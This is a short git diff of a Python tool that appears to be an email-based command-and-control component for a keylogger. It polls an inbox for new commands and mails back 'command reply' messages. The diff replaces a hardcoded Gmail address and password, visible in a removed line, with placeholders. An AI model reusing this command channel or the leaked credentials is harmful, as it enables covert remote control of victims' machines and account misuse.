@@ -84,7 +84,8 @@ class For_new_commands:
     def __init__(self):
         self.date_list = []
     def execution(self):
-        read = Read("forkeylogger101@gmail.com","loggerkey101")
+        #replace with your email and passwords
+        read = Read("email","password")
         content = read.main()
         for msgs in content:
             if msgs["Date"] not in self.date_list:
@@ -110,6 +111,7 @@ class cmd_process:
 class cmd_sender:
     def send_execute(self):
         while True:
+            #replace with your email and passwords
             send = Send("email","email","password")
             new_command = command_checker.execution()
             subject = "command reply"
